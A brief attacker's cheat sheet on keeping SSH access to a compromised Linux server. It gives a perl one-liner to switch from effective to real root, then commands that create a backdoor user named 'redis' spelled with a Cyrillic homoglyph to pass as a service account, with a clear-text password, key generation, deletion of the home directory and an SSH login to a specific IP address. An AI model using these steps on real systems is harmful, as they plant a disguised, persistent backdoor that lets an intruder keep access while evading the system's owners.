### Adduser ssh persistance:

Go from root EUID to root UID:
perl -MEnglish -e '$UID = 0; $ENV{PATH} = "/bin:/usr/bin:/sbin:/usr/sbin"; exec "su - root"'

useradd  -m -s /bin/bash rеdis
usermod -aG rеdis
passwd rеdis
avar112233!
su rеdis
ssh-keygen
rm -dr /home/rеdis

ssh rеdis@103.23.61.92 -i id_rsa

You can get creative if needed: <https://www.lexilogos.com/keyboard/russian.htm>

/home/r\320\265dis/.ssh